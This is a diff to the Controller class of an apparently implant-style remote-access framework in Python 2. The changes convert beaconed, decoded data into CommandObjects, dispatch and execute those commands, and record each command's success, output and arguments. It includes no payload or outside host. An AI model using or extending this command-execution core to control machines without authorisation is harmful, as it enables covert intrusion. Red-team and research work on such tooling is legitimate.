@@ -9,16 +9,6 @@ import warnings
 from implant_modules.command_object import CommandObject
 from implant_modules.order import Order
 
-# TODO:
-# - Add a transform method which allows the settings XML document to define the 'key' for commands and their KVP parameters. This will need to be a transform of the command handler that occurs AFTER the imports.
-# - Considering wrapping each node into a Node class upon initial import.
-# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
-# - Consider change command modules from {cmd:params} to (cmd, params) tuple. Better utilizes types to separate data. 
-# - more flexible designation of where to send the results/responses
-# - Add behaviors as modules
-# - make the sending of results/responses optional
-# - make the results sending have an option of be dependant upon the command (i.e each command results can be sent somewhere different, or not at all, etc)
-
 class Controller:
     
     beacon_map = {}
@@ -86,6 +76,40 @@ class Controller:
                 ret_val[module_name] = module_class # maps the Class object to the appropriate module name
             
         return ret_val
+    
+    @staticmethod
+    def recursive_convert_to_cmd_objects(data):
+        """
+        This function will turn the decoded beaconed data and turn it into a list of CommandObjects. See the CommandObject
+        DOCSTRING for details on how it parses the data.
+        
+        This function will fail gracefully. Would rather not execute a badly decoded command than crash the process.
+        """
+        com_objs = []
+        
+        try: 
+            if type(data) is list or type(data) is tuple:
+                
+                for com in data:
+                    com_objs.append(Controller.recursive_convert_to_cmd_objects(com))
+            
+            elif isinstance(data,basestring) or type(data) is dict:
+                new_co = CommandObject(data)
+                com_objs.append(new_co)
+
+            else:
+                print config.COD_PROMPT + 'Command Data was not formatted as dict, list/tuple, string! type is %s' % type(data)
+                raise
+            
+            ## NOTE: If nested multiple commands breaks, this is likely the culprit
+            if len(com_objs) == 1:
+                com_objs = com_objs[0]
+                
+        except Exception, e:
+                print e
+                print config.COD_PROMPT + " Issue in format while trying to translate to CommandObject %s" % (data)
+
+        return com_objs
     
     # ###############    
     # HANDLER BUILDERS
@@ -227,7 +251,6 @@ class Controller:
                         return (False, None)
                     
             else:
-                print type(encoded_data), encoded_data
                 print config.COD_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
                 raise
             
@@ -236,7 +259,6 @@ class Controller:
                 decoded_data = decoded_data[0]
                 
         except Exception, e:
-                print e
                 print config.COD_PROMPT + " Issue in codec while trying to code %s" % (encoded_data)
                 return (False, None)
         
@@ -275,21 +297,22 @@ class Controller:
 
         try:
 
-            if type_check is dict:
+            if type_check is CommandObject:
                 cmd_obj = None
                 args = None
-                for cmd, params in command.items():
-                    cmd_class = self.command_map.get(cmd)
-                    cmd_obj = cmd_class()
-                    args = params
-                    print config.CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
-                    success, results = cmd_obj.execute(params)
+                
+                cmd = command.name
+                cmd_class = self.command_map.get(cmd)
+                cmd_obj = cmd_class()
+                args = command.args
+                print config.CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
+                success, results = cmd_obj.execute(args)
     
                 cmd_results = {}
-                cmd_results[config.CMD_SUCC_KEY] = success
-                cmd_results[config.CMD_RES_KEY] = results
-                cmd_results[config.CMD_NAME_KEY] = cmd_obj.name()
-                cmd_results[config.CMD_ARGS_KEY] = args 
+                cmd_results[config.CMD_SUCC_KEY] = success # store if the command was sucecssful or not
+                cmd_results[config.CMD_RES_KEY] = results # store the returned output of the command
+                cmd_results[config.CMD_NAME_KEY] = cmd_obj.name() # store the command name
+                cmd_results[config.CMD_ARGS_KEY] = args # store the argumenst the command was ran with
                 agg_results.append(cmd_results)
 
             elif type_check is list:
@@ -302,7 +325,7 @@ class Controller:
 
                     
             else:
-                print config.CMD_PROMPT + " Improper formatted command: %s" % (command)
+                print config.CMD_PROMPT + " Improperly formatted command: %s" % (command)
             
         except Exception, e:
             raise
@@ -395,8 +418,9 @@ class Controller:
             if success:
                 #TODO: Here we should turn tuples, strings, dicts and lists into CommandObjects. Then add these CommandObjects to the Order. 
                 # then hand the Order to the command handler, from there it should
-                order.commands = decoded_data
-                success, results = self.handle_command(decoded_data)
+                command_objects = Controller.recursive_convert_to_cmd_objects(decoded_data)
+                order.commands = command_objects
+                success, results = self.handle_command(order.commands)
                 order.results = results
             else:
                 return False
